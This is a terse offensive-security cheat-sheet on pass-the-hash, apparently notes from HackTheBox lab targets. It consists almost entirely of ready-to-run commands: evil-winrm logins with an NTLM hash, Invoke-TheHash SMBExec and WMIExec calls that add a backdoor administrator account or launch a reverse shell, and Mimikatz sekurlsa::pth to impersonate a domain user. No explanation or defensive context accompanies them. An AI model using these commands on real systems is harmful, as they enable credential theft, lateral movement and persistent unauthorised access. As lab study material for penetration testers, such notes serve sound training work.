```
evil-winrm -u tom -H 984958945894594958495 -i dog.htb
```

# Invoke-thehash with SMB
- [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) 
```
Import-Module .\Invoke-TheHash.psd1 
```
```
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
		OR
```
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "reverse shell"
```

#### Mimikatz (windows) 
```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
```
dir \\dc01\julio
```
#### Powershell (windows) 
```
Invoke-SMBExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
```
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "reverse_shell"
```